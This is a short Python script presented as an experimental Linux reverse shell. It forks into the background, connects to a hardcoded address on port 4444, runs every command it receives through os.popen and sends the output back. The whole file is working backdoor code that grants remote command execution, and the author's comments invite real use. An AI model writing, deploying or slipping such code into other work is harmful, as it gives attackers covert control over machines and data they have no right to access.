#!/usr/bin/env python3
# Linux simple reverse shell in python3
# This is an experiment, I don't really recommend using this in a real scenario. But if you do, buy me a coffee one day.

import socket,os,subprocess

def open_socket(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        return s

    # Looking for a way to circunvent this: for some reason, when I make this script run in the background, it would always raise ConnectionRefusedError, even tho the connection is established.
    except ConnectionRefusedError:
        return None
    except socket.error as e:
        print(f"Connection failed: {e}")
        return None

def cmd_exec(s):
    try:
        while True:
            cmd = s.recv(1024).decode('UTF-8').strip()
            if cmd == "exit":
                break
                return 0
        
            output = os.popen(cmd).read()
            s.send(output.encode())

    except BrokenPipeError:
        return 1

    except socket.error:
        return 1

    return 0


def main():
    t = "192.168.15.91"
    p = 4444

    try:
        s = open_socket(t, p)
        if s:
            cmd_exec(s)

    except Exception:
        if s:
            s.close()
        return 1

    finally:
        if s:
            s.close()
    return 0

if __name__ == "__main__":
    if os.fork() == 0:
        main()
        os._exit(0)

    os._exit(0)
